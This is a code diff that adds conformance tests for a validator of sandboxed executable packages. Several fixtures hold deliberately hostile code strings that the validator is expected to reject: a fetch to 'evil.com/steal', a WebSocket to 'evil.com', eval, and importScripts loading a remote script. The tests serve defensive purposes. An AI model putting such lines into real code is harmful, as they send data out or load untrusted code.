@@ -9,6 +9,7 @@
 // The suite is run via /api/conformance/run.
 
 import { validateDeclarativeArtifact, createDeclarativeImplementation } from "./declarative-artifact";
+import { validateExecutableArtifact } from "./executable-artifact";
 import { isCompatible, PROTOCOL_VERSIONS, versionString } from "./protocol-versions";
 
 export interface ConformanceResult {
@@ -270,6 +271,127 @@ function testIncompatibleVersionRejected(): ConformanceResult {
   };
 }
 
+// ── PL-EXEC: Sandboxed executable packages (R1 Tier B) ────────────
+
+function testExecutableArtifactValidation(): ConformanceResult {
+  const artifact = {
+    abiVersion: "1.0.0",
+    name: "@test/executable-test",
+    displayName: "Executable Test",
+    family: "creature",
+    capabilities: ["test.cap"],
+    provides: ["test.provides"],
+    requires: [],
+    initialState: { x: 0 },
+    code: "function userUpdate(delta) { state.x += delta; }",
+  };
+  const validation = validateExecutableArtifact(artifact);
+  return {
+    name: "PL-EXEC-01: Valid executable artifact passes validation",
+    passed: validation.valid,
+    detail: validation.errors.join("; ") || "passed",
+  };
+}
+
+function testExecutableFetchBlocked(): ConformanceResult {
+  const artifact = {
+    abiVersion: "1.0.0",
+    name: "@test/malicious-fetch",
+    displayName: "Malicious Fetch",
+    family: "building",
+    capabilities: [],
+    provides: [],
+    requires: [],
+    initialState: {},
+    code: "function userUpdate() { fetch('https://evil.com/steal'); }",
+  };
+  const validation = validateExecutableArtifact(artifact);
+  return {
+    name: "PL-EXEC-02: fetch() in executable artifact blocked",
+    passed: !validation.valid && validation.errors.some((e) => e.includes("fetch")),
+    detail: validation.errors.join("; "),
+  };
+}
+
+function testExecutableWebSocketBlocked(): ConformanceResult {
+  const artifact = {
+    abiVersion: "1.0.0",
+    name: "@test/malicious-ws",
+    displayName: "Malicious WS",
+    family: "building",
+    capabilities: [],
+    provides: [],
+    requires: [],
+    initialState: {},
+    code: "function userUpdate() { new WebSocket('wss://evil.com'); }",
+  };
+  const validation = validateExecutableArtifact(artifact);
+  return {
+    name: "PL-EXEC-03: WebSocket in executable artifact blocked",
+    passed: !validation.valid && validation.errors.some((e) => e.includes("WebSocket")),
+    detail: validation.errors.join("; "),
+  };
+}
+
+function testExecutableEvalBlocked(): ConformanceResult {
+  const artifact = {
+    abiVersion: "1.0.0",
+    name: "@test/malicious-eval",
+    displayName: "Malicious Eval",
+    family: "building",
+    capabilities: [],
+    provides: [],
+    requires: [],
+    initialState: {},
+    code: "function userUpdate() { eval('malicious code'); }",
+  };
+  const validation = validateExecutableArtifact(artifact);
+  return {
+    name: "PL-EXEC-04: eval() in executable artifact blocked",
+    passed: !validation.valid && validation.errors.some((e) => e.includes("eval")),
+    detail: validation.errors.join("; "),
+  };
+}
+
+function testExecutableImportScriptsBlocked(): ConformanceResult {
+  const artifact = {
+    abiVersion: "1.0.0",
+    name: "@test/malicious-import",
+    displayName: "Malicious Import",
+    family: "building",
+    capabilities: [],
+    provides: [],
+    requires: [],
+    initialState: {},
+    code: "function userUpdate() { importScripts('https://evil.com/code.js'); }",
+  };
+  const validation = validateExecutableArtifact(artifact);
+  return {
+    name: "PL-EXEC-05: importScripts() in executable artifact blocked",
+    passed: !validation.valid && validation.errors.some((e) => e.includes("importScripts")),
+    detail: validation.errors.join("; "),
+  };
+}
+
+function testExecutableMissingCode(): ConformanceResult {
+  const artifact = {
+    abiVersion: "1.0.0",
+    name: "@test/no-code",
+    displayName: "No Code",
+    family: "building",
+    capabilities: [],
+    provides: [],
+    requires: [],
+    initialState: {},
+  };
+  const validation = validateExecutableArtifact(artifact);
+  return {
+    name: "PL-EXEC-06: Missing code field rejected",
+    passed: !validation.valid && validation.errors.some((e) => e.includes("code")),
+    detail: validation.errors.join("; "),
+  };
+}
+
 // ── Run the full suite ────────────────────────────────────────────
 
 export function runConformanceSuite(): ConformanceSuite {
@@ -292,6 +414,13 @@ export function runConformanceSuite(): ConformanceSuite {
     testInvalidArtifactRejected,
     testMissingFieldsRejected,
     testIncompatibleVersionRejected,
+    // PL-EXEC (R1 Tier B — sandboxed executable packages)
+    testExecutableArtifactValidation,
+    testExecutableFetchBlocked,
+    testExecutableWebSocketBlocked,
+    testExecutableEvalBlocked,
+    testExecutableImportScriptsBlocked,
+    testExecutableMissingCode,
   ];
 
   const results = tests.map((test) => {
